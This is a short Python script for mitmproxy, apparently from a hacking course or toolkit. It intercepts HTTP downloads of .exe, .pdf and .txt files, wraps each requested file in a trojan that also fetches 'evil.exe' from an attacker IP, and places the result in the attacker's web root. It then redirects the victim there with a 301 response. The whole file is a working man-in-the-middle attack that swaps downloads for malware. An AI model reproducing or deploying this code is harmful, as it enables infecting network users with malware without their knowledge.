import mitmproxy
import subprocess
from Trojan import *


IP = "10.20.215.8"
TARGET_TEXTENSIONS = [".exe", ".pdf", ".txt"]
EVIL_FILE = "http://10.20.215.8/evil.exe#"
SPOOF_EXTENSION = False

def request(flow):
	#code to handle request flows
	
	if flow.request.host != IP and flow.request.pretty_url.endswith(tuple(TARGET_TEXTENSIONS)):
		print("[+] Got interesting flow")
		
		front_file_name = flow.request.pretty_url.split("/")[-1].split(".")[0]
		front_file = flow.request.pretty_url + "#"
		trojan_file = "/var/www/html/" + front_file_name + ".exe"

		print("[+] Generating a trojan for " + flow.request.pretty_url)

		trojan = Trojan(front_file, EVIL_FILE, None)
		trojan.create()
		trojan.compile(trojan_file)

		if SPOOF_EXTENSION == True: 
			trojan.zip(trojan_file)


		torjan_download_url = "http://" + IP + "/" + front_file_name + ".exe"		
		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location": torjan_download_url})
